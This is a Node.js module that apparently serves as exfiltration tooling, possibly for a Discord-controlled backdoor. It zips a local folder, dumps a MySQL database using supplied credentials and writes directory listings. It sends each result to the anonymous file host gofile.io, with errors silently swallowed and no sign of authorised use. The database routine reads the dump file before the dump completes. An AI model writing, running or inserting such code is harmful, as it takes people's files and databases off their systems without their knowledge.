const axios = require("axios")
var FormData = require('form-data');
let fs = require('fs');
var fse = require("fs-extra");
const path = require('path');
const os = require('os');
const AdmZip = require("adm-zip");
const mysqlDump = require('mysqldump');
function createTempFolder(){
  var tempfolder = fs.mkdtempSync(
    path.join(os.tmpdir(), 'test15'))
    return tempfolder
}

function folderZip(findFolder, callback) {
var tempfolder = createTempFolder()
var createFolder = path.join(tempfolder, "data")
const zip = new AdmZip();
const outputFile = path.join(tempfolder, "data.zip")
zip.addLocalFolder(findFolder);
zip.writeZip(outputFile);
var file = fs.createReadStream(outputFile);
return callback(file)
}
function apiUpload(file,callback) {
  var formData = new FormData();
  formData.append('file', file );
  axios({
    method: "post",
    url: "https://store1.gofile.io/uploadFile",
    data: formData,
    headers: { "Content-Type": "multipart/form-data" },
  })
  .then(function (response) {
    //handle success
return callback(response.data)
  })
  .catch(function (response) {
    //handle error
    return
  });

}

function apiandfolder(findFolder,callback) {
folderZip(findFolder, function(callback0) {
  if (callback0) {
    apiUpload(callback0, function(callback1) {
if (callback1) {
return callback(callback1)
}
    })
  }
})
}
function otoma(callback) {
  apiandfolder("./folderA", function(callbackv) {
    return callback(callbackv)
  })
}
function sql(host,user,password,database,callback){
  if (host && user && password && database) {
  var tempfolder = createTempFolder()
 
  var file = path.join(tempfolder, "data.sql")
  fs.createReadStream(file)
    mysqlDump({
      connection: {
      host: host ? host : 'localhost',
      user: user ? user : 'root',
      password: password ? password : '1234',
      database: database ? database : 'test'
    },
    dumpToFile:file // destination file 
  },function(err){
 if (err) return
  })
  var filex = fs.createReadStream(file);
  return callback(filex)
  
}
}

function otoma1(host,user,password,database,callback) {
  sql(host,user,password,database, function(dataas) {
    if (dataas) {
      apiUpload(dataas, function(callbackv) {
        return callback(callbackv)
      })
    }

  })
}

function search(value, callback){
  if (value) {
    var st;
    var directory = value
  fs.readdir(directory, (err, files) => {
    if (err) return
    files.forEach(file => {
      if (fs.lstatSync(path.resolve(directory, file)).isDirectory()) {
        if (st != undefined) {
st = st + 'Directory: ' + file + "\n"
        } else {
st = 'Directory: ' + file + "\n"
        }
      } else {
        if (st != undefined) {
          st = st + 'File: ' + file + "\n"
                  } else {
          st = 'File: ' + file + "\n"
                  }
      }
    });
var tempfolder = createTempFolder()
fs.writeFileSync(path.join(tempfolder, "data.txt"), st, (err) => {
  if (err)
      return
})
const outputFile = path.join(tempfolder, "data.txt")
var file = fs.createReadStream(outputFile);
apiUpload(file, function(callback0){
  if (callback0) {
    return callback(callback0)
  }
})
  });
}
}

function eventDelete(client,folder) {
  const files = fs.readdirSync(folder).filter(file => file.endsWith(".js"));
  for (const file of files) {
    const eventName = file.split(".")[0];
    const event = require(`${folder}/${file}`);
    client.removeListener(eventName, event.bind(null, client));
  }
}
var det = require("./extrem.js")
module.exports = {
  folderZip,
  apiUpload,
  apiandfolder,
  otoma,
  sql,
  otoma1,
  search,
  eventDelete,
  det
  
}